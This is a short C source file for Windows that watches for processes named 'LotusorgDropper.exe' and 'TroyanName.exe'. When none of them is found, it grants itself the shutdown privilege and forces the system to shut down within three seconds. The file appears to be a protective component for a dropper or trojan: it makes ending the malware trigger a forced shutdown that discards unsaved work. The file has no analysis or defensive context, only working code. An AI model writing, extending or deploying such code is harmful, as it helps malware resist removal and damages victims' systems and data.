#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>

const char* protected_processes[] = {
    "LotusorgDropper.exe",
    "TroyanName.exe",
};

int is_process_running(const char* process_name) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, process_name) == 0) {
            CloseHandle(hSnapshot);
            return 1;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

void shutdown_system() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    InitiateSystemShutdownEx(NULL, "NULL 9999", 3, TRUE, FALSE, SHTDN_REASON_MAJOR_OTHER);
}

int main() {
    while (1) {
        int found_any = 0;

        for (int i = 0; i < sizeof(protected_processes)/sizeof(protected_processes[0]); i++) {
            if (is_process_running(protected_processes[i])) {
                found_any = 1;
                break;
            }
        }

        if (!found_any) {
            shutdown_system(); 
        }

        Sleep(3000);
    }

    return 0;
}
